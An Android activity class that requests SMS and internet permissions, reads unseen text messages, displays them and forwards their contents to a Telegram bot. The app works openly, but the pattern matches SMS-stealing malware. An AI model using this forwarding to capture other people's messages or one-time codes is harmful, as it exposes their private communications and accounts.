package com.example.smshandler;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;


public class MainActivity extends AppCompatActivity {

    private TextView textView;
    private Context context;

    private SmsService smsService;
    private TelegramBotService telegramBotService;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        App();
    }

    private void App(){
        context = getApplicationContext();
        textView = findViewById(R.id.textView);
        SmsFileService smsFileService = new SmsFileService(context);
        PhoneSmsService phoneSmsService = new PhoneSmsService(getContentResolver());
        smsService = new SmsService(phoneSmsService, smsFileService);
        RequestPermissions();
        telegramBotService = new TelegramBotService(smsService);
        telegramBotService.Init();
    }

    private void FileListing(Sms[] someSms){
        textView.setText(Extensions.GetAllSmsText(someSms));
    }

    private void RequestPermissions(){
        ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.READ_SMS}, PackageManager.PERMISSION_GRANTED);
        ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.RECEIVE_SMS}, PackageManager.PERMISSION_GRANTED);
        ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.INTERNET}, PackageManager.PERMISSION_GRANTED);
    }

    public void Read_SMS(View view){
        Sms[] latestSms = smsService.GetUnseenSms();

        if(latestSms.length > 0){
            FileListing(latestSms);
            telegramBotService.SendMessage(Extensions.GetAllSmsText(latestSms));
        }
    }
}